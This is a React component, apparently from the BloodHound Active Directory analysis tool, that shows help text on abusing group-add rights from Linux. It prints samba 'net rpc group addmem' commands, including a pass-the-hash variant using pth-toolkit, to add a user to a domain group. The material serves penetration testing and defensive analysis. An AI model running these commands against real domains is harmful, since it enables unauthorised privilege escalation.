// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType }) => {
    return (
        <>
            <Typography variant='body2'>
                Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
                or prompted interactively if omitted from the command line:
            </Typography>

            <Typography component={'pre'}>
                {
                    'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                }
            </Typography>

            <Typography variant='body2'>
                It can also be done with pass-the-hash using{' '}
                <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                    pth-toolkit's net tool
                </Link>
                . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
            </Typography>

            <Typography component={'pre'}>
                {
                    'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                }
            </Typography>

            <Typography variant='body2'>Finally, verify that the user was successfully added to the group:</Typography>

            <Typography component={'pre'}>
                {'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}
            </Typography>
        </>
    );
};

export default LinuxAbuse;
